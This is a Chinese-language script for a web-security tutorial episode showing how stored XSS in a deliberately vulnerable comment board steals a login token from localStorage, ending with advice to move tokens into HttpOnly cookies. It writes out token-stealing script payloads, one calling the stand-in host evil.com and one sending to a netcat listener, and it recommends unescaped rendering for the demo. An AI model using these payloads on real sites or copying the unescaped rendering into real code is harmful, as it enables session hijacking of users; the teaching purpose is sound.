# EP05 — XSS 偷走 localStorage（**名场面 1**）

**时长：** 8-10 分钟
**配套代码：** commit `ep5: xss vuln demo`（**故意保留 XSS 漏洞**）
**⚠️ 警告：** 仅供本地学习，请勿部署到公网

---

## [00:00] Hook

**画面：** 分屏：受害浏览器 + 攻击者 netcat 监听窗口

**口播：**
> 我搭一个最简的留言板，token 存在 localStorage。看起来挺正常对吧？接下来我**亲手**演示攻击者怎么把 token 偷走。不是 PPT 上的"原理"，是 1 秒钟真的发出去。看好了。

---

## [00:30] 是什么：XSS 是什么

**画面：** 画图：XSS 攻击路径

**口播：**
> 30 秒回顾 XSS。XSS = Cross-Site Scripting，跨站脚本攻击。核心机制：浏览器渲染 HTML 时会执行里面的 `<script>` 标签。任何让攻击者能把 `<script>` 塞进页面、且浏览器会去执行它的漏洞，都是 XSS。
>
> 经典的 XSS 场景：评论框。攻击者在评论里写 `<script>alert(1)</script>`，服务器没转义就存进数据库。其他用户访问页面，浏览器渲染评论，**直接执行 alert**。这就是最经典的"存储型 XSS"。
>
> 把 alert(1) 换成 `fetch('http://evil.com/?t=' + localStorage.getItem('token'))`，就是 token 盗窃。

---

## [01:30] 怎么实现：搭场景

**画面：** 写后端 / 前端漏洞代码

**口播：**
> 先搭场景。我故意写**有漏洞**的代码。
>
> 后端 `/comment` 接口：直接 `comments.add(content)`，**完全没转义**。
>
> 前端渲染：用 Thymeleaf 的话用 `th:utext` 而不是 `th:text`——`utext` 不转义 HTML，`text` 转义。Vue 的话用 `v-html` 而不是 `{{ }}`——`v-html` 不转义，`{{ }}` 转义。
>
> 这是新手最容易犯的错——为了"显示富文本"用 utext/v-html，结果把整个安全模型搭进去。

**画面：** 受害者登录

**口播：**
> 受害者登录，token 存 localStorage。`localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiJ9...')`。模拟一个真实用户。

---

## [03:30] 怎么实现：现场攻击

**画面：** 攻击者窗口输 netcat 监听

**口播：**
> 攻击者这一侧，起 netcat 监听接收端：`nc -lk 9999`。`nc` 就是 netcat，一个网络瑞士军刀；`-l` 监听模式；`-k` 持续接受多个连接；`9999` 是端口。
>
> 这就是攻击者的"接收站"——你的 token 一旦发到这个端口，就完蛋了。

**画面：** 在评论区输入 payload

**口播：**
> 现在攻击者在评论框输入：
> ```
> 不错！<script>
> fetch('http://localhost:9999/steal?t=' + localStorage.getItem('token'))
> </script>
> ```
>
> 点击提交。评论存进数据库。

**画面：** 受害者打开评论区

**口播：**
> 模拟一个新用户登录，访问评论区。浏览器渲染评论，看到 `<script>` 标签——**立即执行**。
>
> 执行啥？执行 `fetch('http://localhost:9999/steal?t=eyJ...')`。这是 JS 发起的跨域 GET 请求，浏览器把 localStorage 里的 token 拼到 URL，发到攻击者的 netcat。

---

## [06:00] 名场面：netcat 收到 token

**画面：** netcat 窗口红框标 token

**口播：**
> 🎬 **看 netcat 窗口**：
> ```
> GET /steal?t=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.xxx HTTP/1.1
> Host: localhost:9999
> User-Agent: Mozilla/5.0...
> ```
>
> **token 到了**。这就是 80% 中国互联网公司的写法。看着没毛病对吧？—— 5 秒就完了。攻击者现在拿这个 token 调你的 /api/me，冒充你登录。

---

## [07:00] 怎么防：1 个核心答案

**画面：** 一句话防御图

**口播：**
> 怎么防？转义、CSP 都是治标，**真正治本**是把 token 从 localStorage 搬走——HttpOnly Cookie + 双 token 体系。JS 读不到，XSS 偷不走。这是 EP7 的主题。

---

## [10:30] 一句话总结

**口播：**
> 一句话总结：localStorage 容易被 XSS 偷，是因为 JS 啥都能读。**HttpOnly 是治本的方案**——让 JS 根本没机会读。

---

## [10:50] 下集预告

**口播：**
> HttpOnly 是不是就安全了？—— 不！它防不住 CSRF。下集我们来攻击 HttpOnly cookie，让你看到"自动带 cookie 也能被滥用"。受害者已经登录银行站，cookie 是 HttpOnly 的，攻击者在他常去的论坛放一个表单，转账 1 万块，攻击者根本读不到 cookie 但**请求已经发出去了**。下集见。
